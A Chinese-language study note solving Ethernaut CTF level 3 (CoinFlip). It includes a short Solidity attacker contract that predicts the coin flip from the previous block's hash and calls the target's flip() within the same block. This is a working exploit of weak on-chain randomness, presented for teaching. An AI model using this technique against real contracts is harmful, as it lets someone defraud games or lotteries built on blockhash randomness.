# 18_CoinFlip Project

一、挑戰攻破 Ethernaut CTF 第 3 題： CoinFlip

 - 勝利條件：連續猜中硬幣正反面 10 次，使得 ```consecutiveWins``` 的值為 10
 - 知識儲備：Solidity 全域變數、區塊哈希值、Chainlink VRF、Solidity 的介面與強制轉型與調用外部合約函數的技巧


二、解題思路：

1. 先部屬 CoinFlipExtensions 合約，體驗一下 ```block.number``` 、 ```blockhash()``` 的值
2. 構思一個攻擊合約，可以使攻擊合約調用 CoinFlip 合約的函數，因為這會使得兩份合約的 ```block.number``` 、 ```blockhash()``` 的值相同 (同一個區塊內執行)
3. 在攻擊合約內，根據區塊哈希算出來的結果，猜測正反面，並將結果作為參數呼叫 CoinFlip 的 ```flip()```
4. 在 javascript 上，重複呼叫攻擊合約，攻擊 10 次


三、Solidity 技巧補充：關於在合約內部調用外部合約的方法

```solidity
contract CoinFlipAttacker {
    ICoinFlip public target;
    //......

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
}

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
```

1. 撰寫介面，定義你要調用外部合約的函數
2. 將你要調用的合約地址，強制轉型成該介面型別
3. 呼叫該函數